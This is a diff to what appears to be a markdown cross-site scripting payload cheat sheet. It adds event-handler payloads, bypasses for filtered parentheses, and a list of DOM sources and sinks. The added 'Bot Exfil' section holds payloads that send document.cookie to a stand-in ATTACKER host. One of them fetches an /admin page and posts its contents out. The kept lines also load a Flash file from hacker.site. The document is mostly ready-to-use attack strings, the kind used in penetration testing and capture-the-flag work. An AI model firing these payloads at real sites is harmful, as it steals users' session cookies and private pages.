@@ -20,6 +20,10 @@
 ## Payloads
 
 ```html
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<iframe srcdoc="<svg onload=alert(1)>"></iframe>
 <a href="javascript:alert(1)">
 <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
 <form action="javascript:alert(1)"><button>send</button></form>
@@ -34,10 +38,35 @@
 <iframe src="data:text/html,<script>alert(5)</script>"></iframe>
 
 //Special cases
-<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf 
-<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf 
+<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
+<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
 <iframe srcdoc="<svg onload=alert(4);>">
 
+```
+
+## Bot Exfil
+
+```html
+<img src=x onerror="fetch('https://ATTACKER/?c='+document.cookie)">
+<img src=x onerror="navigator.sendBeacon('https://ATTACKER/',document.cookie)">
+<script>location='https://ATTACKER/?c='+encodeURIComponent(document.cookie)</script>
+<script>fetch('/admin').then(r=>r.text()).then(x=>fetch('https://ATTACKER/',{method:'POST',body:x}))</script>
+```
+
+## Parentheses Filtered
+
+```html
+<svg onload=alert`1`>
+<img src=x onerror=eval.call`${'alert\x281\x29'}`>
+<iframe srcdoc="<script>top['al'+'ert']`1`</script>">
+```
+
+## DOM Sources / Sinks
+
+```text
+Sources: location, location.hash, location.search, document.URL, document.referrer, window.name, postMessage
+Sinks: innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, setTimeout, Function, location=
+Search: innerHTML|insertAdjacentHTML|document.write|eval|postMessage|location.hash|window.name
 ```
 
 ## Mutation XSS
